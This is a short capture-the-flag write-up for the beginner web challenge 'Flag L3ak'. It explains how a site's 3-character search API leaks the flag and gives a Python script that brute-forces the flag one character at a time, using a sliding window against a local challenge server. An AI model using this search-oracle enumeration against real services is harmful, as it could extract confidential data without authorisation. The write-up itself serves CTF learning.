# Flag L3ak(beginner)

- **Author:** p._.k
- **Category:** Web
- **Solves:** 698
- **Connection:** `http://34.134.162.213:17000`

## Description

What's the name of this CTF? Yk what to do 😉 Author: p._.k <http://34.134.162.213:17000> [flag_l3ak.zip](<https://ctf.l3ak.team/files/a753e930cce5e57819041baba8c40dcd/flag_l3ak.zip?token=eyJ1c2VyX2lkIjoxMTQ3LCJ0ZWFtX2lkIjo1NjIsImZpbGVfaWQiOjQ3fQ.aHGkxQ.qDvG_3zrsY1Ut3qEJd7E5v7NFj8>)
flag_l3ak.zip

---

### Solution

The search feature on the website allows users to deduce each character of the flag. Since the limit of each search is 3 characters and you know the first 3 letters of the flag (L3A), you can slide the window and brute force for each character within the flag.

```py
import requests
import string
import json

url = 'http://localhost:3000/api/search'
flag = "L3AK{"

while flag[-1] != "}":
    for char in string.printable:
        query = { "query": flag[-2:] + char }
        res = requests.post(url, json.dumps(query), headers={'Content-Type': 'application/json'})
        json_res = json.loads(res.text)
        if json_res['count'] == 0:
            continue

        for post in json_res['results']:
            if post['title'] == 'Not the flag?':
                flag += char
    print(flag)

print("Flag: ", flag)
```

Flag: `L3AK{L3ak1ng_th3_Fl4g??}`
